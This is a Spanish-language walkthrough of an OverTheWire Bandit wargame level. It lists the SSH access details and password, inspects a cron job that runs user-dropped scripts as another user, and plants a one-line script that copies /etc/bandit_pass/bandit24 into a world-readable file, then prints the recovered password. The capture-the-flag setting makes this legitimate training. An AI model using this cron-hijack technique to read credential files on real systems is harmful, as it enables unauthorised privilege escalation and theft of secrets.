## Objetivo
Deberemos crear nuestro propio script en shell para completar este nivel. Primero, investigaremos la configuración en `/etc/cron.d/` para ver qué comando se está ejecutando automáticamente a intervalos regulares. Luego, utilizaremos esta información para desarrollar un script que cumpla con los requisitos del nivel.

## Datos de Acceso al Nivel
- **comando:** ssh
- **host:** bandit.labs.overthewire.org
- **puerto:** 2220
- **usuario:** bandit23
- **contraseña:** 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

## Solución
```bash
ls -l /etc/cron.d
```
```text
total 24
-rw-r--r-- 1 root root 120 Jul 17 15:57 cronjob_bandit22
-rw-r--r-- 1 root root 122 Jul 17 15:57 cronjob_bandit23
-rw-r--r-- 1 root root 120 Jul 17 15:57 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8 14:38 e2scrub_all
-rwx------ 1 root root  52 Jul 17 15:59 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
```
```bash
cat /etc/cron.d/cronjob_bandit24
```
```text
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
```bash
cat /usr/bin/cronjob_bandit24.sh
```
```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
```bash
mkdir /tmp/kd
chmod 777 /tmp/kd
cd /tmp/kd
echo "cat /etc/bandit_pass/bandit24 > /tmp/kd/password" > script.sh
chmod +x script.sh
touch password
chmod 666 password
cp script.sh /var/spool/bandit24/foo
ls -la
```
```text
ls -la
total 10820
drwxrwxrwx    2 bandit23 bandit23     4096 Sep  7 05:38 .
drwxrwx-wt 6872 root     root     11063296 Sep  7 05:40 ..
-rw-rw-rw-    1 bandit23 bandit23       33 Sep  7 05:39 password
-rwxrwxr-x    1 bandit23 bandit23       49 Sep  7 05:38 script.sh
```
```bash
cat password
```
```text
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

## Notas Adicionales


## Referencias